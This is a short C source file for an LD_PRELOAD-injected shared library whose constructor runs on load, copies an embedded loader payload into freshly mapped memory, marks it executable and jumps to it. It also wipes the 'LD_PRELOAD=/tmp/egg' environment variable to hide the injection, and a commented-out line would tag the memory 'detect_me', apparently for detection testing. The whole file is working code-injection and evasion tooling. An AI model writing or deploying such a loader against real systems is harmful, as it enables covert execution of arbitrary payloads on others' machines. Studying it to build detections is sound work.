#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <linux/prctl.h>
#include <sys/prctl.h>
#include "loader/loader.h"

extern char **environ;

#define PAGE_SIZE 4096
#define PAGE_ROUND_UP(x) ( (((unsigned int)(x)) + PAGE_SIZE-1)  & (~(PAGE_SIZE-1)) ) 

void __attribute__((constructor)) setupfun()
{
    unsigned int ps = PAGE_ROUND_UP(loader_bin_len);
    void *payload = mmap(
            0,
            ps,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0
        );
    memcpy(payload, loader_bin, loader_bin_len);
    mprotect(payload, ps, PROT_READ | PROT_WRITE | PROT_EXEC);
    // prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME, payload, ps, "detect_me");
    char *envp = environ[0];
    int i = 0;
    // remove env vars we don't want to stick around
    while (envp != NULL) {
        if (strcmp(envp, "LD_PRELOAD=/tmp/egg") == 0) {
            memset(envp, 0, strlen(envp));
        }
        i++;
        envp = environ[i];
    }
    puts("transfering to loader");
    asm volatile("jmp *%0" : : "r" (payload));
}
